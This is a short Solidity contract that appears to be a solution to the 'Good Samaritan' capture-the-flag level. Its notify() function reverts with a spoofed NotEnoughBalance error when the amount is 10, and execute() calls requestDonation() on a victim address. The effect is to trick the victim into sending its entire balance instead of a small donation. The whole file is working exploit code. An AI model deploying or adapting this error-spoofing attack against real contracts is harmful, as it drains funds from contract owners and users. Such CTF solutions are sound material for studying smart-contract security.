pragma solidity >=0.8.0 <0.9.0;


contract Greedy {
    //mimick error from good samaritan to force transfering entire balance
    error NotEnoughBalance();
    function notify(uint256 amount) external  {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
        
    }
    function execute(address vic) external {
        (bool success, ) = vic.call(abi.encodeWithSelector(bytes4(keccak256("requestDonation()"))));
        require(success, "failed");

    }
}
